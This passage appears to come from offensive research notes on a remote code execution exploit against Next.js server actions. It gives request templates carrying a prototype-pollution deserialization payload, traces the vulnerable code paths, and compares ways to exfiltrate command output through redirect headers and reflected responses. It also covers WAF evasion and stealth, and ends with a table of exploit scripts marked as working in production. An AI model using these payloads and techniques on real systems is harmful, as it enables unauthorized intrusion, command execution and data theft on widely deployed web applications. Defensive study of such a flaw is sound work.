| Practical limit | Memory/timeout constraints |

**Advantage:** Reflect mode can exfiltrate much larger outputs than redirect mode.

**Disadvantage:** Requires valid action ID and compatible action.

### Throw Mode (Error Body)

Throw mode (dev-only) returns output in the error message field:

- JSON-escaped in response body
- No header size limits apply
- Limited only by error serialization

**Note:** Not production-viable due to error sanitization.

---

## Source Code References (Production Behavior)

### Error Sanitization
- Server serialization: `deps/react/packages/react-server/src/ReactFlightServer.js:4131-4165` (emitErrorChunk)
- Client deserialization: `deps/react/packages/react-client/src/ReactFlightClient.js:3290-3305` (resolveErrorProd)
- Error codes: `deps/react/scripts/error-codes/codes.json:429` (error 441)

### Redirect Handling
- Header injection: `deps/next.js/packages/next/src/server/app-render/action-handler.ts:310`
- Redirect error check: `deps/next.js/packages/next/src/server/app-render/action-handler.ts:1055`
- URL extraction: `deps/next.js/packages/next/src/client/components/redirect.ts:76-83`
- Digest format: `deps/next.js/packages/next/src/client/components/redirect.ts:22`

### Model Serialization
- String handling: `deps/react/packages/react-server/src/ReactFlightServer.js:3779-3784`
- Action result flow: `deps/next.js/packages/next/src/server/app-render/action-handler.ts:1036-1046`

---

## Alternative Payload Paths (Research Findings)

### URL-Encoded Payload Path (IMPLEMENTED - REQUIRES ACTION ID)

**Discovery:** Next.js supports URL-encoded form bodies as an alternative to multipart.

**CRITICAL LIMITATION DISCOVERED:** Unlike multipart, URL-encoded path validates action ID **BEFORE** deserialization.

**Trigger Conditions** (`server-action-request-meta.ts:26-28`):
```javascript
const isURLEncodedAction = Boolean(
  req.method === 'POST' && contentType === 'application/x-www-form-urlencoded'
)
```

**Code Path Difference (KEY FINDING):**

For **multipart** (`action-handler.ts:867-892`):
```javascript
// Multipart path - NO action ID validation before decode
boundActionArguments = await decodeReplyFromBusboy(busboy, serverModuleMap, ...)
// RCE happens during deserialization ↑
// Action ID checked AFTER (line 1009-1014)
```

For **URL-encoded** (`action-handler.ts:763-796`):
```javascript
// URL-encoded path - action ID validated FIRST
try {
  actionModId = getActionModIdOrError(actionId, serverModuleMap)  // line 768
} catch (err) {
  return handleUnrecognizedFetchAction(err)  // Returns 404!
}
// Only THEN does decodeReply() get called (line 792)
```

**Implication:** URL-encoded exploit requires a **valid action ID** from the target. With `Next-Action: x`, it returns 404 before reaching vulnerable code.

**FormData Parsing** (`action-handler.ts:63-70`):
```javascript
function formDataFromSearchQueryString(query: string) {
  const searchParams = new URLSearchParams(query)
  const formData = new FormData()
  for (const [key, value] of searchParams) {
    formData.append(key, value)
  }
  return formData
}
```

**Exploit Request Format:**
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Next-Action: <VALID_ACTION_ID>

0=<url-encoded-payload>&1=%22%24%400%22
```

**Comparison with Multipart:**
| Aspect | Multipart | URL-Encoded |
|--------|-----------|-------------|
| Action ID required | **No** | **Yes** |
| Payload format | Complex boundaries | Simple key=value pairs |
| WAF evasion | Boundary patterns detectable | Different signature |
| Size | Larger overhead | More compact |
| Encoding | Base64 blobs | URL encoding only |

**Implementation:** `exploit-urlencoded.sh` - requires action ID from `enumerate-actions.sh`

### Plain Text Path (NOT VIABLE)

**Finding:** When `decodeReply(body)` receives a plain string (not FormData), it wraps it as a single field:

```javascript
if (typeof body === 'string') {
  const form = new FormData();
  form.append('0', body);  // Only field "0" created
  body = form;
}
```

**Problem:** Current exploit requires TWO fields (0 and 1). Field "1" contains `"$@0"` which makes chunk 1 point to chunk 0 object. Without field "1", the `$1:__proto__:then` reference fails.

**Conclusion:** Plain text body path is NOT exploitable with current payload structure.

### notFound() Error Type (NOT VIABLE for Exfil)

**Finding:** `notFound()` throws an error with digest format `NEXT_HTTP_ERROR_FALLBACK;404`.

**Code** (`not-found.ts:21-28`):
```javascript
const DIGEST = `${HTTP_ERROR_FALLBACK_ERROR_CODE};404`

export function notFound(): never {
  const error = new Error(DIGEST) as HTTPAccessFallbackError
  error.digest = DIGEST
  throw error
}
```

**Handling** (`action-handler.ts:1086-1096`):
```javascript
} else if (isHTTPAccessFallbackError(err)) {
  res.statusCode = getAccessFallbackHTTPStatus(err)  // 404
  // No header injection like redirect!
}
```

**Why NOT Exploitable:**
- Digest format: `NEXT_HTTP_ERROR_FALLBACK;{status}` - no attacker-controlled data
- No special header injection like `x-action-redirect`
- Just sets HTTP status code (404, 403, or 401)

**Contrast with Redirect:**
| Error Type | Digest Contains | Header Injection | Exfil Viable |
|------------|-----------------|------------------|--------------|
| NEXT_REDIRECT | Attacker URL | `x-action-redirect` | **YES** |
| NEXT_HTTP_ERROR_FALLBACK | Status code only | None | NO |

---

## Payload Format Comparison

### Current: Multipart Form Data
```http
POST / HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model",...}
------Boundary
Content-Disposition: form-data; name="1"

"$@0"
------Boundary--
```

### Alternative: URL-Encoded
```http
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Next-Action: x

0=%7B%22then%22%3A%22%241%3A__proto__%3Athen%22%2C...%7D&1=%22%24%400%22
```

### Not Viable: Plain Text
```http
POST / HTTP/1.1
Content-Type: text/plain
Next-Action: x

{"then":"$1:__proto__:then",...}
```
(Only creates field "0", can't reference chunk 1)

---

## Implementation Status

### Completed
- [x] **URL-Encoded Exploit** - `exploit-urlencoded.sh` implemented and tested
- [x] **Action ID Enumeration** - `enumerate-actions.sh` implemented and tested
- [x] **Reflect Mode** - `exploit-reflect.sh` implemented and tested
- [x] **Production Verification** - Empirically verified redirect works, throw broken in prod
- [x] **Code Path Analysis** - Discovered URL-encoded validates action ID first

### Remaining Research Areas

**Edge Cases:**
1. ~~**Output size limits**~~ - DOCUMENTED: See "Output Size Limits" section (~6KB safe, ~100KB+ in dev)
2. **Binary output handling** - What happens with non-UTF8 command output?
3. **Special character escaping** - Test quotes, backslashes, null bytes
4. **Compression payload** - Implement gzip+base64 for 3-10x more data in header limits

**Architecture:**
4. **Edge runtime** - Does vulnerability exist in Edge deployments? (No `process.mainModule`)
5. **Alternative RCE primitives** - What works without `process.mainModule`?

**Stealth:**
6. **Echo-action patterns** - Common real-world actions that return input
7. **WAF comparison** - Empirical testing of multipart vs URL-encoded against WAFs

### Script Summary

| Script | Purpose | Action ID | Production |
|--------|---------|-----------|------------|
| `detect.sh` | Vulnerability detection | No | - |
| `exploit-redirect.sh` | **Recommended** - HTTP 303 exfil | No | **Works** |
| `exploit-blind.sh` | Fire-and-forget RCE | No | **Works** |
| `exploit-throw.sh` | HTTP 500 exfil (dev only) | No | Broken |
| `enumerate-actions.sh` | Find action IDs | - | - |
| `exploit-urlencoded.sh` | WAF evasion variant | **Yes** | **Works** |
| `exploit-reflect.sh` | Stealth HTTP 200 exfil | **Yes** | **Works** |
